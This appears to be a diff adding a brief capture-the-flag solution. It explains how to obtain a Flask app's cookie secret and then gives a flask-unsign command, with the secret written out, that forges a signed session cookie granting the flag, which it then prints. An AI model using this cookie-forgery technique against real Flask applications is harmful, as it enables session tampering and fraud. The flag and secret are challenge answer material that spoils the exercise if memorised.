@@ -1,0 +1,5 @@
+Buy `key` to get cookie secret, than sign cookie using this command:
+flask-unsign --secret '7d0b448ffd92f65ac1258df1d867dfcedd2ac36033f129a5cf579db136191447a2536db6c324a8118df7c22b89c736b3fb0d7fa4905ab2a1b546305bf48a455a' --cookie "{'basket': {}, 'stock': {'cookie': 1, 'fake_flag': 10, 'flag': 1, 'flask': 4, 'key': 5, 'source': 1, 'easter_egg': 1}}" --sign
+Refresh and buy the flag
+
+ictf{d0nt_l34k_fl45k_53cr37_k3y}
